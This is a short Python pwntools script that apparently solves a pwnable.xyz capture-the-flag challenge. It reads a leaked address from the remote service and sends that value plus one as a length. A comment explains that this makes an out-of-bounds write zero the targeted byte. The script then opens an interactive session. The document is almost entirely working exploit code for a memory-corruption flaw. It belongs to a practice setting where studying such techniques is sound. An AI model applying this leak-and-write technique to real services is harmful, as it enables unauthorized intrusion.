#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF('challenge')
# context.log_level = "debug"
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(elf.path)
    else:
        return remote('svc.pwnable.xyz',30000) 
# ===========================
io = start()
io.recvuntil('Leak: ')
leak = int(io.recvline(),16)
log.info(f'LEAK: {hex(leak)}')
#   *(undefined *)((long)__buf + (n - 1)) = 0;
#   if n = leak + 1
# then leak pointer will be set to 0
io.sendline(str(leak+1))
io.sendline('anything')
io.interactive()